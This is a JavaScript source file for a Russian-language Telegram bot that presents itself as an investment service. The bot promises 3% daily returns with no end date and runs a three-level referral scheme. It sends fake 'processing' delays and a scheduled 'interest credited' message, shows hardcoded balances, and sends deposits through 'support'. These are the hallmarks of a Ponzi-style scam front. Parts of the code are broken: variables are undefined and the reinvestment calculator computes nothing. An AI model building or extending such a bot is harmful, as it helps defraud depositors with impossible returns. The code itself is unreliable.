const botName = 'rif_beta_bot'
const webUrl = 'https://telegra.ph/RIF-betta-Bot-Dzhonni-D-01-06' 
const webUrlAbout = 'https://telegra.ph/pro-RIF-betta-BOT-01-06' 
const webUrlSupport = 'https://core.telegram.org/bots'
const telegramChanel = 'https://t.me/d_zhonny'
let calcInvest = false
let calcReInvest = false
const inteval = 3000
const balance = 1
const procent = 3
const start = () =>{  
  bot.on('message', async msg => {
    const text = msg.text;
    const chatId = msg.chat.id;
    const userName = msg.from.username;
    const Time = new Date()
if (Time.getHours() === 1)
{
   bot.sendMessage(chatId, "Поценты успешно начислены")
}
    if (text === '/start'){
      // await bot.sendSticker(chatId, `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTieo4VKIoId7ly88NRGp-1dcuRSFiru2SidA&usqp=CAU`)
      return bot.sendMessage(chatId, ` 👋 Добро пожаловать, ${userName}!`, {
        reply_markup: {
          keyboard: [
            [{text: '📊 Депозит'},{text: '💼 Кошелек'}], 
            [{text: '👔 Рефералы'},{text: '📠 Калькулятор'}],
            [{text: '📌 Информация'},{text: '📗 Как начать?'}]
          ], "resize_keyboard": true
        }
      })
    }
    if (text === '📊 Депозит'){
      return bot.sendMessage(chatId, `
      ▫️ Данный раздел для того чтобы открывать инвестиции и получать стабильную прибыль 
      💎 Процент прибыли: ${procent} % 
      🕒 Время доходности: 24 часа 
      📆 Срок вклада: Неограничен 
      💳 Ваш вклад: ${balance}.00 ₽ 
      💵 Заработок: ${balance*(procent/100)} ₽ 
      💸 Доходность за день: ${(balance*(procent/100)) } ₽
      `)
    }
    if (text === '💼 Кошелек'){
      // bot.sendMessage(chanel, ` Имя: ${userName} ID: ${chatId} баланс: ${balance}.00 ₽`)
      return bot.sendMessage(chatId, `
      ▫️ Данный раздел для того чтобы пополнять и выводить денежные средства, перед пополнением обратитесь в поддержку 
      📝 Имя: ${userName} 
      🆔 Ваш ID: ${chatId} 
      💰 Ваш баланс: ${balance}.00 ₽ 
      👥 Рефералов: 0 чел.
      `, {
        reply_markup: {
          keyboard: [
            [{text: 'Пополнить'}, {text: 'Вывести'}]
          ]
        }
      })
    }
    if(add===true){
      if(answer < 1000){
        return bot.sendMessage(chatId, `❌ Минимальная сумма инвестиции: 1000 ₽`)
      }else{
        function add() {
          return bot.sendMessage(chatId, ` ✅ Инвестиция в размере ${answer}.00 ₽ будет засчитана в течении суток! Если этого не произошло обратитесь в службу поддержки`, {
            reply_markup: {
              inline_keyboard: [
                [{text: 'Открыть сайт', web_app: {url:webUrl}}]
              ]
            }
          }
          )
        }
        setTimeout(add, inteval);
        bot.sendMessage(chatId, `🔁 Обрабатываю запрос...`)
      }
    }else if(text === 'Пополнить'){
      bot.sendMessage(chatId, `Введите сумму пополнения:`)
      add = true
      console.log(add)
    }
    if (text === '👔 Рефералы'){
      return bot.sendMessage(chatId, `
      ▫️ Наша реферальная система считается самой эффективной, приглашай друзей и получай 3 руб за активацию робота 
      💸 За депозит каждого реферала предусматривается 3 уровня: 10-5-3% от суммы пополнения реферала 💶
      💰 Всего заработано: 0.00 ₽ 
      👥 Рефералов: 0 чел.
      👤 Вас пригласил: -
      👤 Вы приглашаете человека по реферальной ссылке 
      📩 Когда кто-то переходит по ссылке он становится Вашим рефералом 
      💶 За депозит каждого реферала предусматривается 3 уровня: 10-5-3% от суммы пополнения реферала
      🔗 Ваша реферальная ссылка: 
          https://t.me/NFT_INVEST_PRO_bot?start=${chatId}
          `
      )
    }
    if (text === '📠 Калькулятор'){  
    return bot.sendMessage(chatId, `
    ▫️ Данный раздел для того чтобы рассчитать сумму прибыли 
    👇 Выберите функцию калькулятора:
    `, {
          reply_markup: {
            keyboard: [
              [{text: '💵 Рассчитать сумму депозита'}],
              [{text: '♻️ Рассчитать сумму депозита с реинвестированием'}],
              [{text: 'Отменa!'}]
            ]
          }
        }
    )
    }
    if(calcInvest){
      let answer = text
      if(answer < 1000){
        return bot.sendMessage(chatId, `❌ Минимальная сумма инвестиции: 1000 ₽`)
      }else{
        function calc() {
          return bot.sendMessage(chatId, `
          ✅ Успешно рассчитано! 
          💶 Сумма инвестиции: ${answer}.00 ₽ 
          💎 Процент прибыли: ${procent} % 
          ▫️ Прибыль в день: ${answer*(procent/100)} ₽ 
          ▫️ Прибыль в месяц: ${answer*(procent/100)*30} ₽ 
          ▫️ Прибыль в год: ${answer*(procent/100)*365} ₽
          `
          // , {
          //   reply_markup: {
          //     inline_keyboard: [
          //       [{text: 'Рассчитать повторно', callback_data: '💵 Рассчитать сумму депозита' }]
          //     ]
          //   }
          // }
          )
        }
        setTimeout(calc, inteval);
        bot.sendMessage(chatId, `🔁 Обрабатываю запрос...`)
      }
    }else if(text === '💵 Рассчитать сумму депозита'){
      bot.sendMessage(chatId, `Введите сумму расчёта:`)
      calcInvest = true
    }
    if(calcReInvest){
      let answer = text
      if(answer < 1000){
        return bot.sendMessage(chatId, `❌ Минимальная сумма инвестиции: 1000 ₽`)
      }else{
        function calc() {
            // const count = 7;
            // while (count) {
            //   answer = answer + answer * 0.03;
            //   count = count - 1;
            // }
          return bot.sendMessage(chatId, `                  ✅ Успешно рассчитано! 
          💶 Сумма реинвестиции: ${text}.00 ₽ 
          💎 Процент прибыли: ${procent} % 
          ▫️ Итоговая сумма за неделю: ${answer} ₽ 
          ▫️ Итоговая сумма за 2 недели: ${answer} ₽ 
          ▫️ Итоговая сумма за месяц: ${answer} ₽
          `
          // , {
          //   reply_markup: {
          //     inline_keyboard: [
          //       [{text: 'Рассчитать повторно', callback_data: '💵 Рассчитать сумму депозита' }]
          //     ]
          //   }
          // }
          )
        }
        setTimeout(calc, inteval);
        bot.sendMessage(chatId, `🔁 Обрабатываю запрос...`)
      }
    }else if(text === '♻️ Рассчитать сумму депозита с реинвестированием'){
      bot.sendMessage(chatId, `Введите сумму расчёта:`)
      calcReInvest = true
    }
    if (text === '📌 Информация'){
      return bot.sendMessage(chatId, `✅ ${botName} - это  bot 
      📝 Имя:  ${userName}
      🆔 Ваш ID: ${chatId}
      💰 Ваш баланс: ${balance}.00 ₽
      👥 Рефералы: 0 чел.
      🔸 Выберите пункт меню: `, {
        reply_markup: {
          inline_keyboard: [
            [{text: 'Поддержка', web_app: {url:webUrlSupport}}],
            [{text: 'О проекте', web_app: {url:webUrlAbout}}, {text: 'Наш канал', web_app: {url:telegramChanel}}]
          ]
        }
      })
    }
    if (text === '📗 Как начать?'){
      return bot.sendMessage(chatId, `
      ▫️ Данный раздел для того чтобы пройти краткое обучение`, {
        reply_markup: {
          inline_keyboard: [
            [{text: 'Открыть сайт', web_app: {url:webUrl}}]
          ]
        }
      })
    }
    if (text === 'Отменa!'){
      return bot.sendMessage(chatId, `/start`)
    }
    // return bot.sendMessage(chatId, `ℹ️ Неправильный ввод!`)
  })
}
